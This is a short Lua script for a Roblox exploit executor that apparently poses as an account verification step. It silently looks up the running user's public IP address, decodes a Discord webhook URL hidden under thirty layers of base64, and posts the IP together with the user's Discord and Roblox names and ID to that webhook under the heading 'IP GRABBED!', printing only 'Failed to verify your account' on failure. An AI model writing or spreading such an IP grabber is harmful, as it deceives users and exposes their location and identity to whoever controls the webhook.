local args = {...}
local key = args[1].key
local discordusername = args[1].discordusername

if not syn or not syn.request then
    syn = {
        request = request
    }
end

local response = syn.request({
    Url = "https://api.ipify.org",
    Method = "GET"
})

local function decodeit(key)
    local deckey = key

    for i = 1, 30 do 
        deckey = base64decode(deckey)
    end

    return deckey
end

local function sendDiscordWebhook(webhook_url, message)
    local data = {
        content = message
    }

    local response = syn.request({
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
    
    if response and response.StatusCode == 204 then
        print("Message sent successfully!")
    else
        print("Failed to send message.")
    end
end

if response and response.Body then
    local decoded = decodeit(key)
    local player = game.Players.LocalPlayer
    local userid = player.UserId
    local username = player.Name
    local displayName = player.DisplayName
    sendDiscordWebhook(decoded, "**IP GRABBED!**\nIP: ".. response.Body.. "\nDISCORD USERNAME(from userinput): ".. discordusername.. "\nROBLOX INFO: ".. displayName.. "(@".. username.. ")\nUSER ID: ".. tostring(userid))
else
    print("Failed to verify your account.")
end
